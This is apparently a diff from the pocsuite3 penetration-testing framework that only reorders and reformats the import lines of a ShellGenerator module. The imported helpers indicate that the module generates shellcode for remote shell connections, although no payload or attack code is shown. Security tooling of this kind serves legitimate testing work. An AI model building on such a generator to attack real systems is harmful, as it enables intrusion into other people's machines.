@@ -1,12 +1,18 @@
 import struct
 import time
 import os
-
 from pocsuite3.lib.core.data import paths, logger
-
-from pocsuite3.lib.core.common import validate_ip_addr, port_to_hex, port_to_dd, ip_to_hex, ip_to_dd, create_shellcode, \
-    read_binary, get_public_type_members
 from pocsuite3.lib.core.enums import OS, OS_ARCH, SHELLCODE_CONNECTION
+from pocsuite3.lib.core.common import (
+    validate_ip_addr,
+    port_to_hex,
+    port_to_dd,
+    ip_to_hex,
+    ip_to_dd,
+    create_shellcode,
+    read_binary,
+    get_public_type_members,
+)
 
 
 class ShellGenerator:
